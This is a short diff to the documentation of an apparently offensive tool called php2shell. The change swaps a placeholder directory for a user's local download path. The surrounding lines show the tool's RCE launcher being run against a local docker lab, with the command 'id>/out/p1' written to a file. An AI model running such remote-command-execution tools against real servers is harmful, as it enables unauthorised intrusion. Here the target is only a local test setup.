@@ -181,7 +181,7 @@ docker compose -f docker/docker-compose.yml up -d
 curl -s http://127.0.0.1:8088/index.php          # OK
 
 # 2. Run the launcher (English interface)
-cd /path/to/php2shell
+cd /Users/dpua/Downloads/php-vuln
 python3 tools/php2shell_rce.py \
     -u http://127.0.0.1:8088/index.php \
     -c 'id>/out/p1' \
